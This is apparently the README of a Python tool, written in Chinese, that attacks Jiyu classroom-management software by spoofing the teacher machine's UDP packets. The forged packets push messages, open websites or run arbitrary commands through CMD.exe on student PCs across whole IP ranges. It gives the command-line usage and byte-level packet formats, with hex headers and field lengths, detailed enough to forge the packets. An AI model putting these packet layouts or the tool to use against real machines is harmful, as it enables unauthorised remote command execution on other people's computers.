# Jiyu_udp_attack

利用极域电子教室的 udp 包攻击学生机。

对这方面技术的了解来自 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/)。

## Usage

你可以从 Python 导入 `Jiyu_attack` 模块，也可以使用命令行。

使用 `Jiyu_attack.py -h` 来获取帮助信息：

```
usage: Jiyu_attack.py [-h] -s TEACHER_IP -t TARGET [-p PORT] (-m MESSAGE | -w WEBSITE | -c COMMAND)

Jiyu Attack Script

options:
  -h, --help            show this help message and exit
  -s, --teacher-ip TEACHER_IP
                        Teacher's IP address
  -t, --target TARGET   Target IP address
  -p, --port PORT       Port to send packets to (default: 4705)
  -m, --message MESSAGE
                        Message to send
  -w, --website WEBSITE
                        Website URL to ask to open
  -c, --command COMMAND
                        Command to execute on the target

Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/
```

其中目标 ip 的指定使用了 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/) 的创意，可以：

+ 指定具体 ip，如 `192.168.3.103`；
+ 指定 ip 范围，如 `192.168.3.100-150`；
+ 指定 ip 段，如 `192.168.3.0/24`。

最多指定 65536 个不同 ip。

## Jiyu API

记录抓包得到的极域 udp 包格式。

不记录包头信息，只记录 Data 格式。

子标题名是我自己起的。

### Message

用于教师端向学生端发送信息。

Data 区长 $954$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001009e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a86c019103000091030000000800000000000005000000` |
| $800$ |               信息内容，使用 `utf-16le` 编码               |
| $98$  |                  全 $0$ 段，可能是保留区                   |

### Execute

用于教师端在学生端远程执行命令。

Data 区长 $906$。

| 长度  |                             内容                             |
| :---: | :----------------------------------------------------------: |
| $12$  |                  `444d4f43000001006e030000`                  |
| $16$  |                         随机二进制串                         |
| $32$  | `204e0000c0a8e901610300006103000000020000000000000f00000001000000` |
| $512$ |             可执行程序位置，使用 `utf-16le` 编码             |
| $254$ |                执行参数，使用 `utf-16le` 编码                |
| $66$  |                          全 $0$ 段                           |
|  $1$  |       正常启动 `00`；最小化启动 `01`；最大化启动 `02`        |
| $13$  |                 `00000001000000000000000000`                 |

另外，脚本的 `-c` 功能实际上是使用参数 `f'/D /C "{args.command}"'` 打开程序 `CMD.exe`，这里参数使用 Python 的字符串格式化语法表示。

### Website

用于教师端在学生端远程打开网站。

Data 区变长，至少 $64$ 个字节。

|      长度       |                内容                |
| :-------------: | :--------------------------------: |
|       $8$       |         `444d4f4300000100`         |
|       $4$       |   $\mathrm{size}+36$，小端序编码   |
|      $16$       |            随机二进制串            |
|       $8$       |         `204e0000c0a8e901`         |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|      $16$       | `00020000000000001800000000000000` |
| $\mathrm{size}$ |     网址，使用 `utf-16le` 编码     |
|       $4$       |             全 $0$ 段              |

## License

MIT 协议。
